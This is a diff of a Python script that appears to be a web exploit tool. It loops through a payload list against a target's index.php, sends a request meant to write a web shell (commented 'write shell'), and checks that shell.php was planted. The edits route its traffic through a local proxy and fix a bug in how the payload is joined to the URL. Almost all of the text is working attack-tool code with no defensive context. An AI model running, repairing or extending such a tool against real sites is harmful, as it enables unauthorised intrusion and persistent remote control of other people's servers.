@@ -20,7 +20,7 @@ headers={'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) Ap
         'referer':'http://baidu.com'}
 
 def Requests(url):
-    res = requests.get(url,headers=headers)
+    res = requests.get(url,headers=headers,proxies={'http':'127.0.0.1:8080'})
     if 'www_admintony_com' in res.text:
         return True
     else:
@@ -28,7 +28,7 @@ def Requests(url):
 
 def Requests_write(url,URL):
     # 写shell
-    requests.get(url,headers=headers)
+    requests.get(url,headers=headers,proxies={'http':'127.0.0.1:8080'})
     # 验证是否写入成功
     res1 = requests.get(URL+'/shell.php')
     if 'www_admintony_com' in res1.text:
@@ -47,8 +47,9 @@ def Scan(url):
         url = url+'/index.php'
     i = 0
     flag =False
+    u = url
     while i<5:
-        url = url+payload.get(i)
+        url = u+payload.get(i)
         #print(payload.get(i))
         if not flag:
             if i<4:
